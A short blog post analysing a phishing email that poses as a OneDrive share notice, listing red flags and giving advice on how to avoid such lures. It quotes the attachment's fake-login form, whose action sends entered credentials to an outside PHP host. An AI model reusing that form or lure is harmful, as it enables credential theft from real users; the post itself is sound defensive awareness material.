Today's phishing email (Subject    Re: Contract Lease Agreement)
======================================================================
.. post:: 14, Apr, 2023
   :category: Uncategorized
   :author: jiangshengvc
   :nocomments:

The email body is as the following

   **<your email id>  has recieved a file to your onedrive "2023 Contract
   Agreement .xlsx**"

   When and where did this happen

   Date:4/13/2023 4:50:56 p.m.

   Browser: Chrome

   Operating System: Windows 10

   *You are receiving this information because someone shared a file to
   your OneDrive.See details in the attached file*.

   I have marked red flags with red background.

   1 Microsoft does not address you by your login. Microsoft has your name
   and prefix/suffix info. 

   2 Microsoft would not misspell words.

   3 Microsoft would not ask to open attachment.

the Microsoft Message Header Analyzer tool (mha.azurewebsites.net) has
the correct Received Headers, which means the sender address is not
spoofed. That means, unfortunately, the sender address is compromised.
It is easy to see why:

The attachment is a fake Microsoft login page that looks exactly like
the real one. However the address bar is a local file (where the
attached file is) instead of Microsoft’s domain (address bar may be
hidden on mobile browsers). If Microsoft wants you to login, it would
simply link to a Microsoft owned address.

In the source code of the attachment you can see the following section:

<form action="https://4f-ip.com/sharepoint%20(1)%20(2).php"
autocomplete="" method="post">

the victim who open the attachment and blindly entered Microsoft account
and password would have login info sent to the hacker’s address instead.

Moral of the story:

* Do not interact with email addressing you by login name (Equifax leaked names of half of US population so this is not exactly fool-proof).
* Check for misspellings.
* Do not interact with emails with attachments unless you can verify the sender is legitimate.
* Do not open attachments from strangers if possible.
* Always check the address bar before entering password.
